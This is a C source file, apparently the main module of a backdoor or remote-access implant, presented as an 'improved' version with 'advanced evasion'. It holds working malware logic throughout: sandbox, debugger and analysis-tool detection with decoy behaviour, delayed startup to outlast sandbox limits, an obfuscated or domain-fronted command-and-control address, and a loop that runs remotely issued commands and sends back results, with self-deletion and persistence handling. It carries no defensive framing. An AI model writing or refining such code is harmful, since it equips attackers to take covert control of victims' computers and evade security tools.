// Improved Main Entry Point with Advanced Evasion
// Significantly harder to detect and analyze

#include "config.h"
#include "utils.h"
#include "commands.h"
#include "protocol.h"
#include "evasion.h"

// Forward declarations
int main_payload_improved(void);

// Platform-specific entry points
#ifdef PLATFORM_WINDOWS

int WINAPI WinMainCRTStartup(void) {
    return main_payload_improved();
}

#elif defined(PLATFORM_LINUX) || defined(PLATFORM_MACOS)

int main(void) {
    return main_payload_improved();
}

#endif

// Improved main payload logic with stealth
int main_payload_improved(void) {
    // Initialize random seed from multiple sources
    uint32_t seed = get_tick_count() ^ get_process_id() ^ get_random_hardware();
    set_random_seed(seed);
    
    // ═══════════════════════════════════════════════════════════
    // PHASE 1: PRE-EXECUTION CHECKS (Anti-Analysis)
    // ═══════════════════════════════════════════════════════════
    
    // Comprehensive evasion checks
    if (!should_execute()) {
        // Detected sandbox/debugger/VM - act normal and exit
        perform_decoy_behavior();  // Do something innocent
        return 0;  // Exit gracefully
    }
    
    // Check for analysis tools
    if (detect_analysis_tools()) {
        // Analysis tools detected - behave normally
        perform_decoy_behavior();
        return 0;
    }
    
    // ═══════════════════════════════════════════════════════════
    // PHASE 2: DELAYED STARTUP (Sandbox Evasion)
    // ═══════════════════════════════════════════════════════════
    
    // Realistic startup delay with legitimate-looking behavior
    // This defeats most sandbox time limits (usually 2-5 minutes)
    stealthy_startup();  // 70-200 seconds of realistic delays
    
    // ═══════════════════════════════════════════════════════════
    // PHASE 3: NETWORK INITIALIZATION (Stealth)
    // ═══════════════════════════════════════════════════════════
    
    // Check internet connectivity first (to legitimate sites)
    if (!check_internet_connectivity()) {
        // No internet - wait and retry
        jittered_sleep(60000, 30000);  // 30-90 seconds
        
        if (!check_internet_connectivity()) {
            // Still no internet, give up for now
            return 0;
        }
    }
    
    // Initialize networking
    if (socket_init() != ERR_SUCCESS) {
        return 1;
    }
    
    // ═══════════════════════════════════════════════════════════
    // PHASE 4: C2 CONNECTION (Obfuscated)
    // ═══════════════════════════════════════════════════════════
    
    // Deobfuscate C2 address at runtime
    char c2_host[256] = {0};
    
#ifdef USE_DOMAIN_FRONTING
    // Use CDN domain fronting
    get_fronted_domain(c2_host, sizeof(c2_host));
#else
    // Deobfuscate actual C2 address
    deobfuscate_c2_address(c2_host, sizeof(c2_host));
#endif
    
    uint16_t c2_port = SERVER_PORT;
    
    // ═══════════════════════════════════════════════════════════
    // PHASE 5: MAIN COMMUNICATION LOOP (Smart Retry)
    // ═══════════════════════════════════════════════════════════
    
    retry_config_t retry_config = {
        .attempt = 0,
        .base_delay = 5000,      // Start with 5 seconds
        .max_delay = 300000      // Max 5 minutes
    };
    
    int max_retries = 15 + (get_random_int() % 10);  // 15-25 random
    
    while (retry_config.attempt < max_retries) {
        // Random delay before connection attempt
        if (retry_config.attempt > 0) {
            uint32_t delay = calculate_retry_delay(&retry_config);
            polymorphic_sleep(delay);  // Randomized sleep behavior
        }
        
        // Time-based activation check
#ifdef ENABLE_TIME_ACTIVATION
        if (!is_business_hours()) {
            // Outside business hours, wait
            jittered_sleep(600000, 300000);  // Wait 5-15 minutes
            continue;
        }
#endif
        
        // Create socket
        int sock = socket_create();
        if (sock < 0) {
            continue;
        }
        
        // Set timeout with jitter
        uint32_t timeout = 25000 + (get_random_int() % 10000);  // 25-35s
        socket_set_timeout(sock, timeout);
        
        // Connect to C2
        if (socket_connect(sock, c2_host, c2_port) < 0) {
            socket_close(sock);
            continue;
        }
        
        // Handshake
        if (protocol_handshake_simple(sock) != ERR_SUCCESS) {
            socket_close(sock);
            continue;
        }
        
        // ═══════════════════════════════════════════════════════════
        // PHASE 6: COMMAND LOOP (Connected)
        // ═══════════════════════════════════════════════════════════
        
        retry_config.attempt = 0;  // Reset on successful connection
        
        while (1) {
            // Add random idle time (looks more natural)
            uint32_t idle = random_delay(100, 5000);  // 0.1-5 seconds
            sleep_ms(idle);
            
            // Receive command
            uint8_t cmd_buffer[4096];
            size_t cmd_len = sizeof(cmd_buffer);
            
            int result = protocol_receive(sock, cmd_buffer, &cmd_len);
            if (result != ERR_SUCCESS) {
                // Connection lost
                break;
            }
            
            // Parse command
            if (cmd_len >= sizeof(command_packet_t)) {
                command_packet_t* cmd = (command_packet_t*)cmd_buffer;
                
                // Verify magic
                if (cmd->magic != PROTOCOL_MAGIC) {
                    continue;
                }
                
                // Prepare response
                uint8_t response[8192];
                size_t response_len = sizeof(response);
                
                // Execute command
                result = execute_command(cmd->cmd_id, 
                                        cmd->data, 
                                        cmd->data_len, 
                                        response, 
                                        &response_len);
                
                // Add random delay before response (looks more natural)
                uint32_t delay = random_delay(50, 500);  // 50-500ms
                sleep_ms(delay);
                
                // Send response
                result = protocol_send(sock, response, response_len);
                if (result != ERR_SUCCESS) {
                    break;
                }
                
                // Check for killswitch
                if (cmd->cmd_id == CMD_KILLSWITCH) {
                    socket_close(sock);
                    socket_cleanup();
                    
                    // Self-destruct (optional)
#ifdef ENABLE_SELF_DESTRUCT
                    delete_self();
#endif
                    return 0;
                }
                
                // Check for uninstall
                if (cmd->cmd_id == CMD_UNINSTALL) {
                    socket_close(sock);
                    socket_cleanup();
                    
                    // Remove persistence
                    remove_persistence();
                    
                    // Delete self
                    delete_self();
                    return 0;
                }
            }
        }
        
        // Close connection
        socket_close(sock);
        
        // Random delay before reconnecting
        jittered_sleep(10000, 5000);  // 5-15 seconds
    }
    
    // ═══════════════════════════════════════════════════════════
    // PHASE 7: CLEANUP
    // ═══════════════════════════════════════════════════════════
    
    socket_cleanup();
    
    // If max retries reached, wait a long time and try again
    // (persistent malware behavior)
#ifdef ENABLE_PERSISTENCE
    jittered_sleep(1800000, 600000);  // 20-40 minutes
    // Could loop back or rely on persistence mechanism
#endif
    
    return 0;
}
